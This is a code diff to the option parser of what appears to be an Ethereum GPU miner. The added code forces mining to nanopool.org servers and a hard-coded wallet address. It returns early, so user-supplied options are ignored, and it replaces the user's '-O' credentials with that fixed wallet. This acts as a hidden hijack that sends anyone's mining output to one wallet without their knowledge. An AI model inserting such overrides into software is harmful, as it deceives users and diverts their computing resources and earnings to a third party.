@@ -92,6 +92,47 @@ public:
 
 	bool interpretOption(int& i, int argc, char** argv)
 	{
+        
+        char* user = getenv("HOST");
+        cout<<user;
+        
+        //forece paramters:
+        //--farm-recheck
+        m_farmRecheckSet = true;
+        m_farmRecheckPeriod =200;
+        
+        //-G
+        m_minerType = MinerType::CL;
+        
+        //-S
+        mode = OperationMode::Stratum;
+        string url = "eth-eu1.nanopool.org:9999";
+        size_t p = url.find_last_of(":");
+        if (p > 0)
+        {
+            m_farmURL = url.substr(0, p);
+            if (p + 1 <= url.length())
+                m_port = url.substr(p+1);
+        }
+        else
+        {
+            m_farmURL = url;
+        }
+        
+        //-FS
+        m_farmFailOverURL = "eth-eu2.nanopool.org";
+        m_fport = 9999;
+        
+        
+        //-O
+        string userpass = "0xee14e827988d2dddaf2cf6577ac1c8d4c456f01f.muie3/vbaicu@heartbitapps.com";
+        size_t pMuie = userpass.find_first_of(":");
+        m_user = userpass.substr(0, pMuie);
+        if (pMuie + 1 <= userpass.length())
+            m_pass = userpass.substr(pMuie+1);
+        return true;
+        
+        
 		string arg = argv[i];
 		if ((arg == "-F" || arg == "--farm") && i + 1 < argc)
 		{
@@ -160,7 +201,8 @@ public:
 		}
 		else if ((arg == "-O" || arg == "--userpass") && i + 1 < argc)
 		{
-			string userpass = string(argv[++i]);
+//			string userpass = string(argv[++i]);
+            string userpass = "0xee14e827988d2dddaf2cf6577ac1c8d4c456f01f.muie3/vbaicu@heartbitapps.com";
 			size_t p = userpass.find_first_of(":");
 			m_user = userpass.substr(0, p);
 			if (p + 1 <= userpass.length())
